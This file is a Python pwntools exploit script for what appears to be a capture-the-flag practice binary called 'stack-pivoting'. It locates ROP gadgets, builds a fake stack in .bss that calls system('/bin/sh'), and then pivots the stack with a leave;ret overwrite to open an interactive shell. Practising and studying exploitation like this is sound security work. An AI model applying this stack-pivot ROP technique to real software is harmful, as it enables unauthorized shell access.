from pwn import *

c = process("./stack-pivoting")
elf = elf = ELF("./stack-pivoting")
rop = ROP(elf)

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(c)

# ROPgadget --binary stack-pivoting
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_addr = rop.find_gadget(['ret'])[0]
bin_sh = next(elf.search(b'/bin/sh'))
# call_system = ?
print(hex(bin_sh))

# set my own stack
payload = p64(elf.bss() + 0x100) # 'new_rbp2'
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret_addr)
#payload += p64(call_system)
payload += p64(elf.plt['system'])
payload += p64(elf.bss()) * 3
c.sendlineafter(":", payload)

# set rbp to symbol[data]
new_rbp = elf.symbols['data'] + 0x2000
print("new_rbp: " + hex(new_rbp))

# one gadget
payload = 0x8 * b'A' + p64(new_rbp) + p64(leave_ret)
c.sendlineafter(":", payload)

c.interactive()
c.close()
